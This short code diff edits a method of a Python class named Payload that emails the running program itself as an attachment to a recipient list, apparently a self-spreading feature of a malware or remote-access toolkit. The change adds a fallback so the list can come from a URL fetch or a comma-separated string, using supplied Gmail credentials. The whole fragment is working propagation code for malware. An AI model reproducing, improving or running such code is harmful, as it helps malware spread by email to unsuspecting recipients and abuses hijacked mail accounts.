@@ -1167,7 +1167,12 @@ class Payload():
         try:
             attachment = sys.argv[0]
             gmail, password, url = args.split()
-            recipients = urlopen(url).read().splitlines()
+
+            try:
+                recipients = urlopen(url).read().splitlines()
+            except:
+                recipients = url.split(",")
+
             return globals()['spreader'].run(gmail, password, attachment, recipients)
         except Exception as e:
             return '{} error: {}'.format(self.spread.__name__, str(e))
